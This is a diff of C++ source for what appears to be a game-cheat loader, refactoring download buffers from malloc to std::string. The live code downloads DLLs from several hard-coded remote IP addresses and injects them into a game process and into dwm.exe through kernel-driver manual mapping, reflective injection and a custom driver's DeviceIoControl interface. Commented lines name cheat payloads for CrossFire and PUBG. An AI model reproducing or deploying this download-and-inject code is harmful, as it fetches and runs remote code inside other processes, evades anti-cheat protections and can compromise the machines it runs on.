@@ -12,9 +12,8 @@
 #define OutputDebugStringA_3Param(fmt,var1,var2,var3) {CHAR sOut[256];CHAR sfmt[50];sprintf_s(sfmt,"%s%s","",fmt);sprintf_s(sOut,(sfmt),var1,var2,var3);OutputDebugStringA(sOut);}
 
 Driver drv;
-char* dll_buffer = (char*)malloc(1024 * 1024 * 10);
+std::string dll_buffer;
 int dll_buffer_size = 0;
-int dll_buffer_http_head = 0;
 
 
 //BOOL UpPermissions()
@@ -375,7 +374,7 @@ int main()
 		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/TestDll.dll", dll_buffer, &dll_buffer_http_head);
 		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/InstrumentationCallbackTest.dll", dll_buffer, &dll_buffer_http_head);
 		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/ExceptionTest.dll", dll_buffer, &dll_buffer_http_head);
-		dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", dll_buffer, &dll_buffer_http_head);
+		dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_buffer);
 		//OutputDebugStringA_1Param("[GN]:dll文件大小：%d", dll_buffer_size);
 		if (dll_buffer_size > 0)
 		{
@@ -405,7 +404,7 @@ int main()
 				{
 					//const char* transfer_data = "这是效验的数据";
 					//printf("注入状态：%d\n", drv.ReflectiveInject(modulehandle + 0x1BC244, 14, (LPBYTE)(dll_buffer + dll_buffer_http_head), dll_buffer_size, (PVOID)transfer_data, strlen(transfer_data) * 2));
-					printf("注入状态：%d\n", drv.ManualMapInject(modulehandle + 0x1BC604, 14, (LPBYTE)(dll_buffer + dll_buffer_http_head), dll_buffer_size));
+					printf("注入状态：%d\n", drv.ManualMapInject(modulehandle + 0x1BC604, 14, (LPBYTE)(dll_buffer.data()), dll_buffer_size));
 				}
 				else
 					printf("获取模块失败！\n");
@@ -468,9 +467,8 @@ int main()
 
 		//UpPermissions();
 
-		char* dwm_dll_file = (char*)malloc(1024 * 1024 * 1);
+		std::string dwm_dll_file;
 		int dwm_dll_file_size = 0;
-		int dwm_dll_http_head = 0;
 
 		//char dll_file_path[4096] = { NULL };
 		//wchar_t temp_dll_file_path[4096 * 2];
@@ -483,14 +481,12 @@ int main()
 		//	printf("注入dwm状态：%s\n", drv.InjectByRemoteThreadEx(drv.GetProcessPIDW(L"dwm.exe"), temp_dll_file_path) ? "成功" : "失败");
 		//}
 
-		dwm_dll_file_size = drv.DownLoadFile("112.18.159.26:456", "/RemoteFile/Resource/Resource_D_Debug.dll", dwm_dll_file, &dwm_dll_http_head);
+		dwm_dll_file_size = drv.DownLoadFile("112.18.159.26:456", "/RemoteFile/Resource/Resource_D_Debug.dll", &dwm_dll_file);
 		if (dwm_dll_file_size > 0)
 		{
-			printf("注入dwm状态：%s\n", drv.Original_ReflectiveInject(drv.GetProcessPIDW(L"dwm.exe"), dwm_dll_file + dwm_dll_http_head, dwm_dll_file_size, (PVOID)"Test_Data", strlen("Test_Data") + 1) ? "成功" : "失败");
+			printf("注入dwm状态：%s\n", drv.Original_ReflectiveInject(drv.GetProcessPIDW(L"dwm.exe"), dwm_dll_file.data(), dwm_dll_file_size, (PVOID)"Test_Data", strlen("Test_Data") + 1) ? "成功" : "失败");
 		}
 
-		if (dwm_dll_file)
-			free(dwm_dll_file);
 		break;
 	}
 	case 25:
@@ -544,13 +540,12 @@ int main()
 		//scanf("%d", &pid);
 				
 		//下载dll
-		char* dll_file = (char*)malloc(1024 * 1024 * 5);
+		std::string dll_file;
 		int dll_file_size = 0;
-		int dll_http_head = 0;
-		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-ReflectiveLoader-DLL-Demo.dll", dll_file, &dll_http_head);
-		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-DLL-PUBG.dll", dll_file, &dll_http_head);
-		dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", dll_file, &dll_http_head);
-		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/CF-CheatEngine.dll", dll_file, &dll_http_head);
+		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-ReflectiveLoader-DLL-Demo.dll", &dll_file);
+		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-DLL-PUBG.dll", &dll_file);
+		dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_file);
+		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/CF-CheatEngine.dll", &dll_file);
 		if (dll_file_size > 0)
 			printf("dll下载成功\n");
 		else
@@ -573,14 +568,12 @@ int main()
 				}
 
 				//进行注入操作 
-				DWORD inject_value = drv.InjectByKernelHackThreadMemoryLoadEx(game_pid, (PVOID)(dll_file + dll_http_head), dll_file_size, 3000, _ReadWriteModle::MDL);
+				DWORD inject_value = drv.InjectByKernelHackThreadMemoryLoadEx(game_pid, (PVOID)dll_file.data(), dll_file_size, 3000, _ReadWriteModle::MDL);
 				printf("注入状态：%s", inject_value ? "成功" : "失败");
 				break;
 			}
 		}
 
-		if (dll_file)
-			free(dll_file);
 		break;
 	}
 	case 30:
@@ -595,10 +588,9 @@ int main()
 	case 31:
 	{
 		//下载dll
-		char* dll_file = (char*)malloc(1024 * 1024 * 5);
+		std::string dll_file;
 		int dll_file_size = 0;
-		int dll_http_head = 0;
-		dll_file_size = drv.DownLoadFile("221.236.23.10:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", dll_file, &dll_http_head);
+		dll_file_size = drv.DownLoadFile("221.236.23.10:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_file);
 		printf("下载大小：%d\n", dll_file_size);
 		if (dll_file_size <= 0)
 		{
@@ -610,7 +602,7 @@ int main()
 		ULONG dwWrite;
 		PVOID return_buffer = NULL;
 		HANDLE hDevice = CreateFile(L"\\\\.\\GN_NewLinker", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-		DeviceIoControl(hDevice, CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_IN_DIRECT, FILE_ANY_ACCESS), (PVOID)(dll_file + dll_http_head), dll_file_size, &return_buffer, sizeof(return_buffer), &dwWrite, NULL);
+		DeviceIoControl(hDevice, CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_IN_DIRECT, FILE_ANY_ACCESS), (PVOID)(dll_file.data()), dll_file_size, &return_buffer, sizeof(return_buffer), &dwWrite, NULL);
 		CloseHandle(hDevice);
 
 		break;
